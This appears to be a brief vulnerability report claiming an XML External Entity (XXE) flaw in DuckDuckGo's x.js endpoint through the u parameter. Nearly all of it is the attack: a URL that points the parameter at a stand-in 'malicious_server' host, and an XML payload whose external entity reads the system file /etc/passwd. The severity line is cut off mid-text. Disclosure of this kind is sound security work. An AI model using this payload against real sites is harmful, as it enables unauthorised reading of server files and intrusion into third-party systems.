
Severity	Critical (9 ~ 10

An XML External Entity (XXE) injection vulnerability was discovered in the x.js endpoint on https://duckduckgo.com via u parameter. 

URL：https://duckduckgo.com/x.js?u=http://malicious_server/xxe.xml

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>    
```